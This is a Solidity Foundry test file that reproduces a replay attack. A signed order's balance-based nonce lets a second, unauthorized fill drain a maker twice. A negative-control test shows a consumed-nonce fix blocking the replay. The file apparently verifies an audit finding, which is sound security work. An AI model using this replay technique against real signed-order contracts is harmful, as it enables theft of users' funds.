// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    SuperpositionVault,
    SuperpositionVaultFixed,
    MakerWallet,
    MiniToken,
    Order,
    hashOrder
} from "./63501-replay-attack-via-balance-based-nonce-mixbytes-none-barter-d.sol";

contract BalanceNonceReplayTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant FILL = 100 ether;
    uint256 internal constant PRICE = 100 ether;

    // Buggy path: one signed order authorizing a single 100 makerToken fill is
    // replayed after the maker's balance recovers, draining 200 to the attacker.
    function test_exploit_balanceNonceReplay_drainsMakerTwice() public {
        Exploit e = new Exploit();
        e.run();

        MiniToken makerToken = MiniToken(e.makerTokenAddr());

        // The single signature authorized ONE 100-unit fill.
        assertEq(e.authorizedAmount(), FILL, "order authorized a single 100 fill");
        // Yet both the authorized fill AND the unauthorized replay executed.
        assertEq(e.firstFillLoot(), FILL, "authorized fill drained 100");
        assertEq(e.secondFillLoot(), FILL, "unauthorized replay drained another 100");
        assertEq(e.attackerLoot(), 2 * FILL, "2x fill from one signature");

        // Harm: the attacker EOA holds 200 STOLEN-MAKER from a one-time order.
        assertEq(makerToken.balanceOf(ATTACKER), 200 ether, "attacker holds 200 STOLEN-MAKER");
    }

    // Negative control: replacing the balance-nonce with a consumed-nonce mapping
    // (OpenZeppelin Nonces) makes the identical replay revert — only one fill drains.
    function test_control_consumedNonce_blocksReplay() public {
        MiniToken makerToken = new MiniToken("Superposition Maker", "STOLEN-MAKER");
        MiniToken takerToken = new MiniToken("Taker USD", "TAKER");
        MakerWallet maker = new MakerWallet();
        SuperpositionVaultFixed vault = new SuperpositionVaultFixed();

        makerToken.mint(address(maker), FILL);
        Order memory order = Order({
            maker: address(maker),
            makerToken: makerToken,
            takerToken: takerToken,
            makerAmount: FILL,
            takerAmount: PRICE,
            nonceBalance: FILL,
            deadline: type(uint256).max
        });
        bytes32 orderHash = hashOrder(order);
        maker.signOrder(orderHash);
        maker.approveToken(makerToken, address(vault), type(uint256).max);

        // this test contract is the taker
        takerToken.mint(address(this), 2 * PRICE);
        takerToken.approve(address(vault), type(uint256).max);

        // fill #1 succeeds and consumes the order's nonce
        vault.swap(order, "");
        assertEq(makerToken.balanceOf(address(this)), FILL, "single authorized fill");

        // maker balance recovers, but the consumed nonce blocks the replay
        makerToken.mint(address(maker), FILL);
        vm.expectRevert(abi.encodeWithSelector(SuperpositionVaultFixed.OrderAlreadyUsed.selector, orderHash));
        vault.swap(order, "");

        // still only one fill drained under the fix
        assertEq(makerToken.balanceOf(address(this)), FILL, "replay blocked: still one fill");
    }
}
